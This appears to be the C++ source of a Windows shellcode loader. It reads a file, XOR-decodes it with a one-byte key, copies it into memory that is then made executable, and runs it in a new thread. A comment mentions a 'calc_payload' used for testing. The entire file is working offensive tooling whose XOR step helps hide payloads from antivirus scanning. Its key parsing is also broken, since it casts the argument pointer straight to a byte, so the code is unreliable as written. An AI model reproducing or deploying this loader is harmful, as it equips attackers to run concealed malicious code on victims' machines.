#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <WinError.h>
#include <Windows.h>

using namespace std;

// XOR the data from a given file.
void XOREncoding(vector <BYTE>& data, BYTE key)
{
	for (auto& byte: data)
	{
        byte ^= key;
	}
}

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];  

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " [key] [file]\n";
        return 1;
    }

    // Get the XOR encription key from command line
    BYTE key = reinterpret_cast<BYTE>(argv[1]);
    string filename = argv[2];

    // Read the file
    vector<BYTE> fileData = ReadBinaryFile(filename);

    if (fileData.empty()) {
        return 2;  
    }

    XOREncoding(fileData, key);

    void* exec_mem = VirtualAlloc(0, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // printf("%-20%s : 0x%-16p\n", "calc_payload addr", fileData);
    printf("%-20s : 0x%-16p\n", "exec_mem addr", (void *)exec_mem);
    RtlMoveMemory(exec_mem, fileData.data(), fileData.size());

    // Make buffer executable
    DWORD oldprotect = 0;
    BOOL rv = VirtualProtect(exec_mem, fileData.size(), PAGE_EXECUTE_READ, &oldprotect);

    cout << "hit me" << endl;
    getchar();

    HANDLE th;

    if (rv !=0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
